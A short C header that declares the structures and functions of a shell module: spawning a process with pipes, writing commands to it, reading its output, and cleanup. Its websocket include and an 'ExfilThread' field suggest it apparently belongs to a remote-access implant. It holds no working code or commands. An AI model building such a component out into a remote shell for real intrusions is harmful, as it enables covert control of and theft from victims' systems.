#ifndef SHELL_H
#define SHELL_H

#include "DynamicBuffer.h"
#include "Websocket.h"

typedef struct _ReadShellOutPutThread{
    LPREQINFO reqInfo;
    void * StdoutPipe[2];
    void * StdInPipe[2];
    PROCESS_INFORMATION processInfo;
    void * ExfilThread;
} ReadShellOutPutThread , * LPReadShellOutPutThread;


int SpawnShell(LPReadShellOutPutThread info);
int WriteToShell(void * StdoinPipe, PDYNBUF_INFO cmd);
void ReadFromShellThread(HANDLE data);
void CleaupShell(LPReadShellOutPutThread info);
#endif